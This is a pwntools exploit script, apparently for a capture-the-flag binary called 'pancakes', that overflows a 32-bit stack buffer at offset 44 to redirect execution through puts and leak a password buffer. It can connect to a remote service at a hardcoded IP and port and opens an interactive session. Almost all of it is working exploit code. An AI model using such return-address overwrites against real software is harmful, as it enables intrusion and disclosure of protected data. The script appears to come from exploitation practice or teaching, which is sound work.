#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pancakes
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pancakes')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8199, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

ind_size = 4

eip_offset = 44
esp_offset = eip_offset - 4
exe_segment = 0x8048000
got_plt = exe_segment + 0x4000
got_plt_puts = got_plt + 0x18
mov_pass_addr = 0x0804926c
pass_addr = 0x0804c060
puts_addr = 0x08049060
printf_addr = 0x08049040
printf_arg1 = int.from_bytes(bytes("ciao", "ascii"), "little")
printf_arg2 = 0x33333333

payload = dict()

payload[eip_offset] = p32(puts_addr)
payload[eip_offset + 2*ind_size] = p32(pass_addr)
#payload[eip_offset + 2*ind_size] = p32(0x0804a02b)
#payload[eip_offset + 2*ind_size] = p32(printf_arg1)
#payload[eip_offset + 3*ind_size] = p32(printf_arg2)

payload = fit(payload)
log.info(payload)

io.recvuntil("> ")
io.sendline(payload)

io.interactive()

